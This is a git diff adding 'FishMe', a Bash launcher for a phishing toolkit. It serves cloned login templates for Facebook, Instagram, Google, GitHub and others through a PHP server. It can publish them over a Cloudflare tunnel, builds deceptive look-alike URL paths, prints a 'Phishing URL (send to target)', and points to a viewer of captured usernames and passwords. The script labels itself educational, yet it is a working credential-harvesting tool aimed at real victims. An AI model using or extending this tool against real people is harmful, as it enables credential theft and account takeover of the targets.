@@ -1,0 +1,639 @@
+#!/bin/bash
+
+__version__="1.0.0"
+HOST='127.0.0.1'
+PORT='8080'
+
+RED="$(printf '\033[31m')"
+GREEN="$(printf '\033[32m')"
+ORANGE="$(printf '\033[33m')"
+BLUE="$(printf '\033[34m')"
+CYAN="$(printf '\033[36m')"
+WHITE="$(printf '\033[37m')"
+BOLD="$(printf '\033[1m')"
+DIM="$(printf '\033[2m')"
+RESET="$(printf '\033[0m')"
+
+BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
+SITES_ROOT="${BASE_DIR}/templates"
+GITHUB_REPO="https://github.com/syed-sameer-ul-hassan/FishME"
+GITHUB_BRANCH="main"
+
+trap 'echo -e "\n${RED}[!]${RESET} Interrupted."; exit 0' SIGINT
+
+# Generate a convincing phishing-style URL for educational demo
+# Format: sitename.com-[long random alphanumeric]
+generate_phish_url() {
+    local site="$1"
+    # Map site names to realistic domain bases
+    case "${site,,}" in
+        facebook)  local base="facebook.com" ;;
+        instagram) local base="instagram.com" ;;
+        discord)   local base="discord.com" ;;
+        google)    local base="google.com" ;;
+        github)    local base="github.com" ;;
+        gitlab)    local base="gitlab.com" ;;
+        dropbox)   local base="dropbox.com" ;;
+        adobe)     local base="adobe.com" ;;
+        ebay)      local base="ebay.com" ;;
+        badoo)     local base="badoo.com" ;;
+        deviantart)local base="deviantart.com" ;;
+        *)         local base="${site}.com" ;;
+    esac
+    # Generate long random alphanumeric suffix — 60 chars + 40 chars with dot separator
+    local chars="abcdefghijklmnopqrstuvwxyz0123456789"
+    local rand1="" rand2=""
+    for i in $(seq 1 48); do
+        rand1+="${chars:RANDOM%${#chars}:1}"
+    done
+    for i in $(seq 1 16); do
+        rand2+="${chars:RANDOM%${#chars}:1}"
+    done
+    # Format: sitename.com-[48chars].[16chars].page.dev
+    echo "${base}-${rand1}.${rand2}.page.dev"
+}
+
+check_cloudflared() {
+    if command -v cloudflared &>/dev/null; then
+        return 0
+    fi
+    return 1
+}
+
+install_cloudflared() {
+    echo -e "  ${CYAN}[i]${RESET} Installing cloudflared..."
+    local arch
+    arch=$(uname -m)
+    local url
+    case "$arch" in
+        x86_64)  url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" ;;
+        aarch64) url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" ;;
+        armv7l)  url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm" ;;
+        *)       echo -e "  ${RED}[!]${RESET} Unsupported architecture: $arch"; return 1 ;;
+    esac
+    if curl -L "$url" -o /tmp/cloudflared --progress-bar; then
+        chmod +x /tmp/cloudflared
+        sudo mv /tmp/cloudflared /usr/local/bin/cloudflared 2>/dev/null || mv /tmp/cloudflared "${BASE_DIR}/cloudflared"
+        echo -e "  ${GREEN}[+]${RESET} cloudflared installed successfully."
+        return 0
+    else
+        echo -e "  ${RED}[!]${RESET} Failed to download cloudflared."
+        return 1
+    fi
+}
+
+banner() {
+    clear
+    echo -e "${CYAN}"
+    echo -e "  ▄████████  ▄█     ▄████████    ▄█    █▄      ▄▄▄▄███▄▄▄▄      ▄████████ "
+    echo -e "  ███    ███ ███    ███    ███   ███    ███   ▄██▀▀▀███▀▀▀██▄   ███    ███ "
+    echo -e "  ███    █▀  ███▌   ███    █▀    ███    ███   ███   ███   ███   ███    █▀  "
+    echo -e " ▄███▄▄▄     ███▌   ███         ▄███▄▄▄▄███▄▄ ███   ███   ███  ▄███▄▄▄     "
+    echo -e "▀▀███▀▀▀     ███▌ ▀███████████ ▀▀███▀▀▀▀███▀  ███   ███   ███ ▀▀███▀▀▀     "
+    echo -e "  ███        ███           ███   ███    ███   ███   ███   ███   ███    █▄  "
+    echo -e "  ███        ███     ▄█    ███   ███    ███   ███   ███   ███   ███    ███ "
+    echo -e "  ███        █▀    ▄████████▀    ███    █▀     ▀█   ███   █▀    ██████████ "
+    echo -e "    ${WHITE} v${__version__}${RESET}"
+    echo
+}
+
+check_php() {
+    if ! command -v php &> /dev/null; then
+        echo -e "${RED}[!]${RESET} PHP is not installed. Please install PHP to use FishMe."
+        exit 1
+    fi
+}
+
+start_server() {
+    check_php
+    clear
+    echo -e "${CYAN}"
+    echo -e "  ▄████████  ▄█     ▄████████    ▄█    █▄      ▄▄▄▄███▄▄▄▄      ▄████████ "
+    echo -e "  ███    ███ ███    ███    ███   ███    ███   ▄██▀▀▀███▀▀▀██▄   ███    ███ "
+    echo -e "  ███    █▀  ███▌   ███    █▀    ███    ███   ███   ███   ███   ███    █▀  "
+    echo -e " ▄███▄▄▄     ███▌   ███         ▄███▄▄▄▄███▄▄ ███   ███   ███  ▄███▄▄▄     "
+    echo -e "▀▀███▀▀▀     ███▌ ▀███████████ ▀▀███▀▀▀▀███▀  ███   ███   ███ ▀▀███▀▀▀     "
+    echo -e "  ███        ███           ███   ███    ███   ███   ███   ███   ███    █▄  "
+    echo -e "  ███        ███     ▄█    ███   ███    ███   ███   ███   ███   ███    ███ "
+    echo -e "  ███        █▀    ▄████████▀    ███    █▀     ▀█   ███   █▀    ██████████ "
+    echo
+    echo -e "${CYAN}=============================================================${RESET}"
+    echo -e "    ${WHITE} v${__version__}${RESET}"
+    echo -e "${CYAN}=============================================================${RESET}"
+    echo -e "  ${DIM}Select a site template to launch${RESET}"
+    echo -e "${CYAN}=============================================================${RESET}"
+    echo
+
+    SITES=()
+    if [[ -d "${SITES_ROOT}" ]]; then
+        for d in "${SITES_ROOT}"/*/; do
+            [[ -f "${d}index.php" ]] && SITES+=("$(basename "$d")")
+        done
+    fi
+
+    if [[ ${#SITES[@]} -eq 0 ]]; then
+        echo -e "${RED}[!]${RESET} No sites found in ${SITES_ROOT}"
+        exit 1
+    fi
+
+    cols=3
+    i=1
+    for s in "${SITES[@]}"; do
+        printf " ${GREEN}%-3s${RESET} %-20s" "[$i]" "$s"
+        if (( i % cols == 0 )); then echo; fi
+        ((i++))
+    done
+    if (( (i-1) % cols != 0 )); then echo; fi
+
+    echo
+    echo -e "${CYAN}=============================================================${RESET}"
+    read -p "  ${CYAN}[?]${RESET} Enter option number: " opt
+
+    if [[ "${opt}" =~ ^[0-9]+$ && ${opt} -ge 1 && ${opt} -le ${#SITES[@]} ]]; then
+        SITE_NAME="${SITES[$((opt-1))]}"
+    else
+        echo -e "${RED}[!]${RESET} Invalid option. Exiting."
+        exit 1
+    fi
+
+    echo
+    read -n1 -p "${CYAN}[?]${RESET} Use custom port? [y/N]: " ans
+    echo
+    if [[ ${ans,,} == "y" ]]; then
+        read -p "${CYAN}[-]${RESET} Enter port [1024-9999]: " cu_p
+        if [[ "${cu_p}" =~ ^([1-9][0-9][0-9][0-9])$ ]] && [[ ${cu_p} -ge 1024 ]]; then PORT=${cu_p}; fi
+    fi
+
+    echo
+    read -n1 -p "${CYAN}[?]${RESET} Use Cloudflare tunnel for public URL? [y/N]: " cf_ans
+    echo
+
+    CF_PID=""
+    CF_URL=""
+    USE_CF=0
+    if [[ ${cf_ans,,} == "y" ]]; then
+        if ! check_cloudflared; then
+            echo -e "  ${ORANGE}[!]${RESET} cloudflared not found."
+            read -n1 -p "  ${CYAN}[?]${RESET} Install it now? [y/N]: " inst_ans
+            echo
+            if [[ ${inst_ans,,} == "y" ]]; then
+                install_cloudflared || { echo -e "  ${RED}[!]${RESET} Skipping Cloudflare tunnel."; }
+            fi
+        fi
+        if check_cloudflared; then
+            USE_CF=1
+        fi
+    fi
+
+    echo -e "\n${GREEN}[+]${RESET} Starting FishMe server..."
+    echo -e "${CYAN}[-]${RESET} Site    : ${BOLD}${SITE_NAME}${RESET}"
+    echo -e "${CYAN}[-]${RESET} Local   : ${BOLD}http://${HOST}:${PORT}/templates/${SITE_NAME}/${RESET}"
+    echo -e "${CYAN}[-]${RESET} Viewer  : ${BOLD}http://${HOST}:${PORT}/viewer.php${RESET}"
+
+    # Start PHP server using router.php so phishing-path URLs work
+    cd "${BASE_DIR}" || exit 1
+    FISHME_ACTIVE_SITE="${SITE_NAME}" php -S "${HOST}:${PORT}" "${BASE_DIR}/router.php" >/dev/null 2>&1 &
+    PHP_PID=$!
+
+    if [[ $USE_CF -eq 1 ]]; then
+        echo -e "${CYAN}[~]${RESET} Starting Cloudflare tunnel..."
+        local cf_log
+        cf_log=$(mktemp)
+
+        # Find cloudflared binary
+        local cf_bin
+        cf_bin=$(command -v cloudflared 2>/dev/null || echo "${BASE_DIR}/cloudflared")
+
+        "$cf_bin" tunnel --url "http://${HOST}:${PORT}" --logfile "$cf_log" >/dev/null 2>&1 &
+        CF_PID=$!
+
+        # Wait for tunnel URL (max 15 seconds)
+        local attempts=0
+        while [[ $attempts -lt 30 ]]; do
+            CF_URL=$(grep -oP 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' "$cf_log" 2>/dev/null | head -1)
+            [[ -n "$CF_URL" ]] && break
+            sleep 0.5
+            ((attempts++))
+        done
+
+        if [[ -n "$CF_URL" ]]; then
+            local phish_path
+            phish_path=$(generate_phish_url "$SITE_NAME")
+            # Active phishing URL = real tunnel URL + phishy path (router.php redirects to template)
+            local active_phish_url="${CF_URL}/${phish_path}/"
+            local viewer_link="${CF_URL}/viewer.php"
+            echo
+            echo -e "${GREEN}══════════════════════════════════════════════════════════════${RESET}"
+            echo -e "${GREEN}         CLOUDFLARE TUNNEL ACTIVE         ${RESET}"
+            echo -e "${GREEN}══════════════════════════════════════════════════════════════${RESET}"
+            echo
+            echo -e "  ${RED}[🎣]${RESET} ${BOLD}Phishing URL (send to target):${RESET}"
+            echo -e "      ${RED}${BOLD}${active_phish_url}${RESET}"
+            echo
+            echo -e "  ${GREEN}[✓]${RESET} Capture viewer : ${WHITE}${BOLD}${viewer_link}${RESET}"
+            echo -e "  ${DIM}[-]${RESET} Direct tunnel  : ${DIM}${CF_URL}/templates/${SITE_NAME}/${RESET}"
+            echo
+            echo -e "  ${DIM}↑ The red URL is ACTIVE — it redirects to the real phishing page via Cloudflare.${RESET}"
+            echo
+        else
+            echo -e "  ${RED}[!]${RESET} Could not get tunnel URL. Check network and try again."
+        fi
+    fi
+
+    echo -e "${GREEN}[+]${RESET} Press ${BOLD}Ctrl+C${RESET} to stop."
+    echo
+
+    # Cleanup function
+    cleanup() {
+        echo -e "\n${CYAN}[~]${RESET} Shutting down..."
+        [[ -n "$PHP_PID" ]] && kill "$PHP_PID" 2>/dev/null
+        [[ -n "$CF_PID" ]] && kill "$CF_PID" 2>/dev/null
+        echo -e "${GREEN}[+]${RESET} Done."
+        exit 0
+    }
+    trap cleanup SIGINT SIGTERM
+
+    wait "$PHP_PID"
+}
+
+list_templates() {
+    clear
+    echo -e "${CYAN}"
+    echo -e "  ███████████                                    ████             █████                    "
+    echo -e "  ░█░░░███░░░█                                   ░░███            ░░███                     "
+    echo -e "  ░   ░███  ░   ██████  █████████████   ████████  ░███   ██████   ███████    ██████   █████ "
+    echo -e "      ░███     ███░░███░░███░░███░░███ ░░███░░███ ░███  ░░░░░███ ░░░███░    ███░░███ ███░░  "
+    echo -e "      ░███    ░███████  ░███ ░███ ░███  ░███ ░███ ░███   ███████   ░███    ░███████ ░░█████ "
+    echo -e "      ░███    ░███░░░   ░███ ░███ ░███  ░███ ░███ ░███  ███░░███   ░███ ███░███░░░   ░░░░███"
+    echo -e "      █████   ░░██████  █████░███ █████ ░███████  █████░░████████  ░░█████ ░░██████  ██████ "
+    echo -e "     ░░░░░     ░░░░░░  ░░░░░ ░░░ ░░░░░  ░███░░░  ░░░░░  ░░░░░░░░    ░░░░░   ░░░░░░  ░░░░░░"
+    echo -e "                                          ░███                                              "
+    echo -e "                                          █████                                             "
+    echo -e "                                         ░░░░░   ${WHITE}site templates${RESET}"
+    echo
+    echo -e "${CYAN}${RESET}"
+    echo -e "  ${DIM}repo: ${WHITE}${SITES_ROOT}${RESET}"
+    echo -e "${CYAN}--------------------------------------------------------------${RESET}"
+    echo
+
+    SITES=()
+    if [[ -d "${SITES_ROOT}" ]]; then
+        for d in "${SITES_ROOT}"/*/; do
+            [[ -f "${d}index.php" ]] && SITES+=("$(basename "$d")")
+        done
+    fi
+
+    if [[ ${#SITES[@]} -eq 0 ]]; then
+        echo -e "  ${RED}[!]${RESET} No templates found in: ${SITES_ROOT}"
+        exit 1
+    fi
+
+    echo -e "  ${DIM}${#SITES[@]} template(s) available${RESET}"
+    echo
+    i=1
+    for s in "${SITES[@]}"; do
+        printf "  ${GREEN}%3s${RESET}  ${BOLD}%-20s${RESET}\n" "[$i]" "$s"
+        ((i++))
+    done
+    echo
+    echo -e "${CYAN}──────────────────────────────────────────────────────────────${RESET}"
+    echo -e "  ${DIM}run ${WHITE}fishme start${DIM} to launch a template${RESET}"
+    echo
+}
+
+uninstall_fishme() {
+    clear
+    echo -e "${ORANGE}"
+    echo -e "        ███        ▄█    █▄       ▄████████ ███▄▄▄▄      ▄█   ▄█▄      ▄██   ▄    ▄██████▄  ███    █▄  "
+    echo -e "    ▀█████████▄   ███    ███     ███    ███ ███▀▀▀██▄   ███ ▄███▀      ███   ██▄ ███    ███ ███    ███ "
+    echo -e "       ▀███▀▀██   ███    ███     ███    ███ ███   ███   ███▐██▀        ███▄▄▄███ ███    ███ ███    ███ "
+    echo -e "        ███   ▀  ▄███▄▄▄▄███▄▄   ███    ███ ███   ███  ▄█████▀         ▀▀▀▀▀▀███ ███    ███ ███    ███ "
+    echo -e "        ███     ▀▀███▀▀▀▀███▀  ▀███████████ ███   ███ ▀▀█████▄         ▄██   ███ ███    ███ ███    ███ "
+    echo -e "        ███       ███    ███     ███    ███ ███   ███   ███▐██▄        ███   ███ ███    ███ ███    ███ "
+    echo -e "        ███       ███    ███     ███    ███ ███   ███   ███ ▀███▄      ███   ███ ███    ███ ███    ███ "
+    echo -e "       ▄████▀     ███    █▀      ███    █▀   ▀█   █▀    ███   ▀█▀       ▀█████▀   ▀██████▀  ████████▀  "
+    echo -e "                                                        ▀                                                "
+    echo -e "                                         ${WHITE}uninstall${RESET}"
+    echo
+    echo -e "${ORANGE}=============================================================${RESET}"
+    echo -e "  ${DIM}Uninstall FishMe from system${RESET}"
+    echo -e "${ORANGE}=============================================================${RESET}"
+    echo
+
+    FISHME_BIN=$(command -v fishme 2>/dev/null)
+
+    if [[ -z "$FISHME_BIN" ]]; then
+        echo -e "  ${RED}[!]${RESET} FishMe is not installed as a system command."
+        echo -e "  ${DIM}(No 'fishme' binary found in PATH)${RESET}"
+        echo
+        echo -e "  ${CYAN}[i]${RESET} The source folder at:"
+        echo -e "      ${WHITE}${BASE_DIR}${RESET}"
+        echo -e "      has NOT been removed."
+        echo
+        exit 0
+    fi
+
+    echo -e "  ${CYAN}[i]${RESET} FishMe system binary found at:"
+    echo -e "      ${WHITE}${FISHME_BIN}${RESET}"
+    echo
+    echo -e "  ${ORANGE}[!]${RESET} This will remove the system-installed ${BOLD}fishme${RESET} command."
+    echo -e "  ${DIM}    The source folder (${BASE_DIR}) will NOT be deleted.${RESET}"
+    echo
+    read -n1 -p "  ${CYAN}[?]${RESET} Are you sure? [y/N]: " confirm
+    echo
+
+    if [[ ${confirm,,} != "y" ]]; then
+        echo -e "\n  ${GREEN}[+]${RESET} Uninstall cancelled."
+        exit 0
+    fi
+
+    if rm -f "$FISHME_BIN" 2>/dev/null; then
+        echo -e "\n  ${GREEN}[+]${RESET} FishMe has been removed from: ${WHITE}${FISHME_BIN}${RESET}"
+    else
+        echo -e "\n  ${CYAN}[-]${RESET} Requires elevated privileges. Trying with sudo..."
+        if sudo rm -f "$FISHME_BIN"; then
+            echo -e "  ${GREEN}[+]${RESET} FishMe has been removed from: ${WHITE}${FISHME_BIN}${RESET}"
+        else
+            echo -e "  ${RED}[!]${RESET} Failed to remove ${FISHME_BIN}. Try manually: sudo rm ${FISHME_BIN}"
+            exit 1
+        fi
+    fi
+
+    echo
+    echo -e "  ${GREEN}[✓]${RESET} Uninstall complete."
+    echo -e "  ${DIM}    Source folder preserved at: ${BASE_DIR}${RESET}"
+    echo
+}
+
+view_captures() {
+    check_php
+    banner
+    echo -e "  ${CYAN}[i]${RESET} Starting Web Viewer UI..."
+    echo -e "  ${CYAN}[-]${RESET} Viewer URL: ${BOLD}http://${HOST}:8081/viewer.php${RESET}"
+    echo -e "  ${GREEN}[+]${RESET} Press ${BOLD}Ctrl+C${RESET} to stop."
+    echo
+    cd "${BASE_DIR}" || exit 1
+    php -S "${HOST}:8081" > /dev/null 2>&1
+}
+
+update_fishme() {
+    clear
+    echo -e "${CYAN}"
+    echo -e "  ███    █▄     ▄███████▄ ████████▄     ▄████████     ███        ▄████████ "
+    echo -e "  ███    ███   ███    ███ ███   ▀███   ███    ███ ▀█████████▄   ███    ███ "
+    echo -e "  ███    ███   ███    ███ ███    ███   ███    ███    ▀███▀▀██   ███    █▀  "
+    echo -e "  ███    ███   ███    ███ ███    ███   ███    ███     ███   ▀  ▄███▄▄▄     "
+    echo -e "  ███    ███ ▀█████████▀  ███    ███ ▀███████████     ███     ▀▀███▀▀▀     "
+    echo -e "  ███    ███   ███        ███    ███   ███    ███     ███       ███    █▄  "
+    echo -e "  ███    ███   ███        ███   ▄███   ███    ███     ███       ███    ███ "
+    echo -e "  ████████▀   ▄████▀      ████████▀    ███    █▀     ▄████▀     ██████████ ${RESET}"
+    echo
+    echo -e "${CYAN}--------------------------------------------------------------${RESET}"
+    echo -e "  ${BOLD}${WHITE}FISHME UPDATER${RESET}   ${DIM}github.com/syed-sameer-ul-hassan/FishME${RESET}"
+    echo -e "${CYAN}--------------------------------------------------------------${RESET}"
+    echo
+    echo -e "  ${CYAN}[i]${RESET} Current version   : ${WHITE}${BOLD}v${__version__}${RESET}"
+    echo -e "  ${CYAN}[i]${RESET} Source directory   : ${WHITE}${BASE_DIR}${RESET}"
+    echo -e "  ${CYAN}[i]${RESET} Remote repository  : ${WHITE}${GITHUB_REPO}${RESET}"
+    echo -e "  ${CYAN}[i]${RESET} Branch             : ${WHITE}${GITHUB_BRANCH}${RESET}"
+    echo
+
+    if ! command -v git &>/dev/null; then
+        echo -e "  ${RED}[!]${RESET} Git is not installed."
+        echo -e "  ${DIM}      Install it with:  sudo apt install git${RESET}"
+        echo
+        exit 1
+    fi
+
+    echo -e "  ${CYAN}[-]${RESET} Checking connection to GitHub..."
+    if ! git ls-remote "${GITHUB_REPO}" HEAD &>/dev/null; then
+        echo -e "  ${RED}[!]${RESET} Cannot reach: ${WHITE}${GITHUB_REPO}${RESET}"
+        echo -e "  ${DIM}      Check your internet connection or create the repo first.${RESET}"
+        echo
+        exit 1
+    fi
+    echo -e "  ${GREEN}[+]${RESET} GitHub is reachable."
+    echo
+
+    cd "${BASE_DIR}" || exit 1
+
+    if [[ -d "${BASE_DIR}/.git" ]]; then
+
+        CURRENT_REMOTE=$(git remote get-url origin 2>/dev/null || echo "")
+
+        if [[ -z "$CURRENT_REMOTE" ]]; then
+            echo -e "  ${CYAN}[-]${RESET} No remote found. Adding origin..."
+            git remote add origin "${GITHUB_REPO}"
+        elif [[ "$CURRENT_REMOTE" != "${GITHUB_REPO}" && "$CURRENT_REMOTE" != "${GITHUB_REPO}.git" ]]; then
+            echo -e "  ${ORANGE}[!]${RESET} Remote origin mismatch:"
+            echo -e "  ${DIM}      Was:  ${CURRENT_REMOTE}${RESET}"
+            echo -e "  ${DIM}      Now:  ${GITHUB_REPO}${RESET}"
+            git remote set-url origin "${GITHUB_REPO}"
+        fi
+
+        echo -e "  ${CYAN}[-]${RESET} Fetching from GitHub..."
+        git fetch origin "${GITHUB_BRANCH}" 2>&1 | sed 's/^/      /'
+        echo
+
+        LOCAL=$(git rev-parse HEAD 2>/dev/null)
+        REMOTE_HASH=$(git rev-parse "origin/${GITHUB_BRANCH}" 2>/dev/null)
+
+        if [[ "$LOCAL" == "$REMOTE_HASH" ]]; then
+            echo -e "  ${GREEN}[✓]${RESET} Already up to date — no changes found."
+            echo -e "  ${DIM}      Version: v${__version__}${RESET}"
+        else
+            COMMIT_COUNT=$(git rev-list HEAD..origin/${GITHUB_BRANCH} --count 2>/dev/null)
+            echo -e "  ${GREEN}[+]${RESET} ${WHITE}${BOLD}${COMMIT_COUNT} new commit(s)${RESET} available from GitHub."
+            echo
+            echo -e "  ${DIM}  -- What's new --${RESET}"
+            git log HEAD..origin/${GITHUB_BRANCH} --oneline --no-merges 2>/dev/null \
+                | head -10 \
+                | while read -r line; do
+                    echo -e "  ${CYAN}  *${RESET} ${DIM}${line}${RESET}"
+                  done
+            echo
+            echo -e "  ${CYAN}[-]${RESET} Pulling update..."
+            git pull origin "${GITHUB_BRANCH}" 2>&1 | sed 's/^/      /'
+            echo
+            echo -e "  ${GREEN}[+]${RESET} FishMe updated successfully from GitHub!"
+            echo -e "  ${DIM}      Run 'fishme -v' to confirm the new version.${RESET}"
+        fi
+
+    else
+        echo -e "  ${ORANGE}[!]${RESET} This folder is not a Git repository."
+        echo -e "  ${CYAN}[i]${RESET} FishMe will clone the repo and sync files here:"
+        echo -e "  ${WHITE}      ${BASE_DIR}${RESET}"
+        echo -e "  ${DIM}      (Your capture/ data will be preserved.)${RESET}"
+        echo
+        read -n1 -p "  ${CYAN}[?]${RESET} Continue? [y/N]: " confirm
+        echo
+
+        if [[ ${confirm,,} != "y" ]]; then
+            echo -e "\n  ${GREEN}[+]${RESET} Update cancelled."
+            exit 0
+        fi
+
+        echo
+        TMP_CLONE=$(mktemp -d)
+        echo -e "  ${CYAN}[-]${RESET} Cloning from GitHub..."
+        if git clone --depth=1 --branch "${GITHUB_BRANCH}" \
+                "${GITHUB_REPO}" "${TMP_CLONE}" 2>&1 | sed 's/^/      /'; then
+            echo
+            echo -e "  ${CYAN}[-]${RESET} Syncing files (preserving capture/ data)..."
+
+            rsync -a --exclude='.git' --exclude='capture/' \
+                "${TMP_CLONE}/" "${BASE_DIR}/" 2>/dev/null || \
+            cp -r "${TMP_CLONE}/." "${BASE_DIR}/" 2>/dev/null
+
+            rm -rf "${TMP_CLONE}"
+            chmod +x "${BASE_DIR}/fishme"
+            echo
+            echo -e "  ${GREEN}[+]${RESET} FishMe updated successfully from GitHub!"
+            echo -e "  ${DIM}      Capture data preserved in capture/${RESET}"
+            echo -e "  ${DIM}      Run 'fishme -v' to confirm the new version.${RESET}"
+        else
+            rm -rf "${TMP_CLONE}"
+            echo -e "\n  ${RED}[!]${RESET} Clone failed."
+            echo -e "  ${DIM}      Make sure the repo is public: ${GITHUB_REPO}${RESET}"
+            exit 1
+        fi
+    fi
+
+    echo
+    echo -e "${CYAN}=============================================================${RESET}"
+    echo
+}
+
+show_help() {
+    clear
+    echo -e "${CYAN}"
+    echo -e "  ███████████                                    ████             █████                    "
+    echo -e "  ░█░░░███░░░█                                   ░░███            ░░███                     "
+    echo -e "  ░   ░███  ░   ██████  █████████████   ████████  ░███   ██████   ███████    ██████   █████ "
+    echo -e "      ░███     ███░░███░░███░░███░░███ ░░███░░███ ░███  ░░░░░███ ░░░███░    ███░░███ ███░░  "
+    echo -e "      ░███    ░███████  ░███ ░███ ░███  ░███ ░███ ░███   ███████   ░███    ░███████ ░░█████ "
+    echo -e "      ░███    ░███░░░   ░███ ░███ ░███  ░███ ░███ ░███  ███░░███   ░███ ███░███░░░   ░░░░███"
+    echo -e "      █████   ░░██████  █████░███ █████ ░███████  █████░░████████  ░░█████ ░░██████  ██████ "
+    echo -e "     ░░░░░     ░░░░░░  ░░░░░ ░░░ ░░░░░  ░███░░░  ░░░░░  ░░░░░░░░    ░░░░░   ░░░░░░  ░░░░░░"
+    echo -e "                                          ░███                                              "
+    echo -e "                                          █████                                             "
+    echo -e "                                         ░░░░░   ${WHITE}help (v${__version__})${RESET}"
+    echo
+    echo
+    echo -e "  ${BOLD}${WHITE}USAGE${RESET}"
+    echo -e "  ${DIM}=============================================================${RESET}"
+    echo -e "    ${WHITE}fishme${RESET} ${CYAN}<command>${RESET} ${DIM}[options]${RESET}"
+    echo
+
+    echo -e "  ${BOLD}${WHITE}CORE COMMANDS${RESET}"
+    echo -e "  ${DIM}=============================================================${RESET}"
+    printf "  ${GREEN}  %-16s${RESET}  ${CYAN}│${RESET}  %s\n" \
+        "start"     "Launch local phishing demo server (interactive)"
+    printf "  ${GREEN}  %-16s${RESET}  ${CYAN}│${RESET}  %s\n" \
+        "list"      "List all available site templates"
+    printf "  ${GREEN}  %-16s${RESET}  ${CYAN}│${RESET}  %s\n" \
+        "capture"   "View credentials captured from simulation"
+    printf "  ${GREEN}  %-16s${RESET}  ${CYAN}│${RESET}  %s\n" \
+        "update"    "Pull latest updates from GitHub"
+    printf "  ${GREEN}  %-16s${RESET}  ${CYAN}│${RESET}  %s\n" \
+        "uninstall" "Remove fishme command from system PATH"
+
+    echo
+    echo -e "  ${BOLD}${WHITE}FLAGS${RESET}"
+    echo -e "  ${DIM}=============================================================${RESET}"
+    printf "  ${ORANGE}  %-16s${RESET}  ${CYAN}│${RESET}  %s\n" \
+        "-v, --version" "Display current version and exit"
+    printf "  ${ORANGE}  %-16s${RESET}  ${CYAN}│${RESET}  %s\n" \
+        "-h, help"      "Display this help screen"
+
+    echo
+    echo -e "  ${BOLD}${WHITE}COMMAND DETAILS${RESET}"
+    echo -e "  ${DIM}=============================================================${RESET}"
+    echo
+    echo -e "  ${CYAN}  fishme start${RESET}"
+    echo -e "  ${DIM}  Starts a PHP built-in web server on localhost. You will be${RESET}"
+    echo -e "  ${DIM}  prompted to choose a template and optionally set a port.${RESET}"
+    echo -e "  ${DIM}  Default: http://127.0.0.1:8080   |   Stop: Ctrl+C${RESET}"
+    echo
+    echo -e "  ${CYAN}  fishme list${RESET}"
+    echo -e "  ${DIM}  Scans the templates/ directory and lists every site with a${RESET}"
+    echo -e "  ${DIM}  valid index.php. Use this to see what you can launch.${RESET}"
+    echo
+    echo -e "  ${CYAN}  fishme capture${RESET}"
+    echo -e "  ${DIM}  Opens the interactive viewer (viewer.php). Shows per-site${RESET}"
+    echo -e "  ${DIM}  activity charts and a credential table (timestamp / IP /${RESET}"
+    echo -e "  ${DIM}  username / password). Data is stored in capture/*.json.${RESET}"
+    echo
+    echo -e "  ${CYAN}  fishme update${RESET}"
+    echo -e "  ${DIM}  Fetches and pulls the latest version from GitHub.${RESET}"
+    echo -e "  ${DIM}  Repo: github.com/syed-sameer-ul-hassan/FishME${RESET}"
+    echo
+    echo -e "  ${CYAN}  fishme uninstall${RESET}"
+    echo -e "  ${DIM}  Finds the fishme binary in PATH and removes it. The source${RESET}"
+    echo -e "  ${DIM}  folder is preserved. Sudo may be required.${RESET}"
+
+    echo
+    echo -e "  ${BOLD}${WHITE}EXAMPLES${RESET}"
+    echo -e "  ${DIM}=============================================================${RESET}"
+    echo -e "  ${DIM}  \$${RESET} ${WHITE}fishme start${RESET}             ${DIM}# Pick a template and start server${RESET}"
+    echo -e "  ${DIM}  \$${RESET} ${WHITE}fishme list${RESET}              ${DIM}# See available phishing templates${RESET}"
+    echo -e "  ${DIM}  \$${RESET} ${WHITE}fishme capture${RESET}           ${DIM}# Inspect captured demo credentials${RESET}"
+    echo -e "  ${DIM}  \$${RESET} ${WHITE}fishme update${RESET}            ${DIM}# Pull latest from GitHub${RESET}"
+    echo -e "  ${DIM}  \$${RESET} ${WHITE}fishme uninstall${RESET}         ${DIM}# Remove fishme system command${RESET}"
+    echo -e "  ${DIM}  \$${RESET} ${WHITE}fishme -v${RESET}                ${DIM}# Print version string${RESET}"
+
+    echo
+    echo -e "  ${BOLD}${WHITE}SYSTEM INFO${RESET}"
+    echo -e "  ${DIM}─────────────────────────────────────────────────────────────${RESET}"
+    printf "  ${DIM}  %-18s${RESET}  %s\n" "Version:"      "${WHITE}v${__version__}${RESET}"
+    printf "  ${DIM}  %-18s${RESET}  %s\n" "Source dir:"   "${WHITE}${BASE_DIR}${RESET}"
+    printf "  ${DIM}  %-18s${RESET}  %s\n" "Templates:"    "${WHITE}${SITES_ROOT}${RESET}"
+    printf "  ${DIM}  %-18s${RESET}  %s\n" "PHP:"          "${WHITE}$(php -r 'echo PHP_VERSION;' 2>/dev/null || echo "not found")${RESET}"
+    printf "  ${DIM}  %-18s${RESET}  %s\n" "Installed at:" "${WHITE}$(command -v fishme 2>/dev/null || echo "not in PATH — run install.sh")${RESET}"
+
+}
+
+show_version() {
+    echo
+    echo -e "  ${CYAN}FishMe${RESET} version ${WHITE}${BOLD}v${__version__}${RESET}"
+    echo -e "  ${DIM}Phishing Awareness & Security Training Platform${RESET}"
+    echo -e "  ${DIM}Educational Use Only — University Cybersecurity Project${RESET}"
+    echo
+}
+
+case "${1,,}" in
+    start)
+        start_server
+        ;;
+    list)
+        list_templates
+        ;;
+    capture)
+        view_captures
+        ;;
+    update)
+        update_fishme
+        ;;
+    uninstall)
+        uninstall_fishme
+        ;;
+    -v|--version|-version|version)
+        show_version
+        ;;
+    help|-h|--help)
+        show_help
+        ;;
+    "")
+        banner
+        echo -e "  ${ORANGE}[!]${RESET} No command specified."
+        echo -e "  ${DIM}    Run ${WHITE}fishme help${DIM} or ${WHITE}fishme -h${DIM} for usage.${RESET}"
+        echo
+        ;;
+    *)
+        banner
+        echo -e "  ${RED}[!]${RESET} Unknown command: ${WHITE}${1}${RESET}"
+        echo -e "  ${DIM}    Run ${WHITE}fishme help${DIM} to see available commands.${RESET}"
+        echo
+        exit 1
+        ;;
+esac
